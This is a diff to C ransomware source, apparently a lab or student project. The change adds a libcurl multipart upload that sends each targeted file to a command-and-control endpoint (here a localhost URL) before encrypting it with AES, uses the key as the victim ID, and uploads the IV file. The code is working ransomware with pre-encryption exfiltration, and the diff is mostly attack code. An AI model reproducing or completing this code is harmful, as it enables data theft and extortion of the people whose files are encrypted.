@@ -20,10 +20,10 @@
 
 #define RSA_KEY_SIZE 4096
 
-void sendFileToApi(const char *path, const char *api);
+void sendFileToApi(const char *path, const char *id, const char *api);
 char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
-void write_to_file(char *key, char *iv);
-void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad);
+void write_to_file(char *key, char *iv, int size);
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL);
 char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
 
 // Liste des extensions à chiffrer
@@ -69,7 +69,8 @@ int main(){
     key_lisible = debug_bytes(key, key_size);
     iv_lisible = debug_bytes(iv, iv_size);
 
-    write_to_file(key_lisible, iv_lisible);
+    write_to_file("aes_key.txt", key_lisible, 64);
+    write_to_file("iv.txt", iv_lisible, 32);
 
     //Authentication string
     static unsigned char aad[] = "Cyan";
@@ -86,14 +87,22 @@ int main(){
     OPENSSL_free(encrypted_aes_key);
     OPENSSL_free(encrypted_iv);
 
-    browse_files(key, iv, aad);
+    char ip[] = "127.0.0.1";
+    int port = 42956;
+    const char *URL[100];
+    const unsigned char *ID = key_lisible;
+    sprintf(URL, "http://%s:%d/upload", ip, port);
+
+    browse_files(key, iv, aad, ID, URL);
+    sendFileToApi("iv.txt", ID, URL);
+
 
     //Redirect to C2's web page for instructions
 
     return 0;
 }
 
-void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad){
+void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad, const char *id, const char *URL){
     // List all the files we want to encrypt
     const char *path;
 
@@ -120,6 +129,8 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad){
         if (extension != NULL) {
             for (size_t j = 0; j < num_extensions; ++j) {
                 if (strcmp(extension, extensions[j]) == 0) {
+                    // Send the files to the C2 before being encrypted
+                    sendFileToApi(pathList.paths[i], id, URL);
                     // Encrypt the file
                     encrypt_file(key, iv, aad, pathList.paths[i]);
                     // Decrypt the file (for demonstration purposes)
@@ -153,17 +164,15 @@ void browse_files(unsigned char *key, unsigned char *iv, unsigned char *aad){
     freePathList(&pathList);
 }
 
-void write_to_file(char *key, char *iv){
+void write_to_file(char *filename, char *value, int size){
     FILE *file_pointer;
-    file_pointer = fopen("aes_key.txt", "w"); // Ouvre le fichier en mode écriture
+    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture
 
     if (file_pointer == NULL) {
         printf("Error: cannot open the file.\n");
     }
 
-    fwrite(key, sizeof(char), 64, file_pointer); // Écrit la clé dans le fichier
-    fwrite("\n", sizeof(char), 1, file_pointer); // Écrit une nouvelle ligne dans le fichier
-    fwrite(iv, sizeof(char), 32, file_pointer); // Écrit l'IV dans le fichier
+    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier
 
     fclose(file_pointer); // Ferme le fichier
 }
@@ -182,42 +191,44 @@ char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size) {
     return lisible;
 }
 
-//WIP
-void sendFileToApi(const char *path, const char *api){
+void sendFileToApi(const char *path, const char *id, const char *api){
     /*Documentation: https://curl.se/libcurl/c/fileupload.html */
     CURL *curl;
     CURLcode res;
-    struct stat file_info;
-    curl_off_t speed_upload, total_time;
-    FILE *fd;
+    curl_mime *form = NULL;
+    curl_mimepart *field = NULL;
 
-    fd = fopen("debugit", "rb"); /* open file to upload */
-    if(!fd)
-        //Woops
+    curl_global_init(CURL_GLOBAL_ALL);
+    curl = curl_easy_init();
+    if (curl) {
+        form = curl_mime_init(curl);
 
-        /* to get the file size */
-        if(fstat(fileno(fd), &file_info) != 0)
-            //Woops
+        // Add the file
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "file");
+        curl_mime_filedata(field, path);
 
-            curl = curl_easy_init();
-    if(curl){
-        /* upload to this place */
-        curl_easy_setopt(curl, CURLOPT_URL,
-                         api);
+        // Add id
+        field = curl_mime_addpart(form);
+        curl_mime_name(field, "id");
+        curl_mime_data(field, id, CURL_ZERO_TERMINATED);
 
-        /* tell it to "upload" to the URL */
-        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
+        // Add road of the api
+        curl_easy_setopt(curl, CURLOPT_URL, api);
 
-        /* set where to read from (on Windows you need to use READFUNCTION too) */
-        curl_easy_setopt(curl, CURLOPT_READDATA, fd);
+        // Attach everything
+        curl_easy_setopt(curl, CURLOPT_MIMEPOST, form);
 
+        // Execute
         res = curl_easy_perform(curl);
-        if(res != CURLE_OK) {
-            //Woops
+        if (res != CURLE_OK) {
+            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
         }
 
+        // Clean to make a new upload
+        curl_mime_free(form);
         curl_easy_cleanup(curl);
     }
-    fclose(fd);
+    curl_global_cleanup();
 
 }
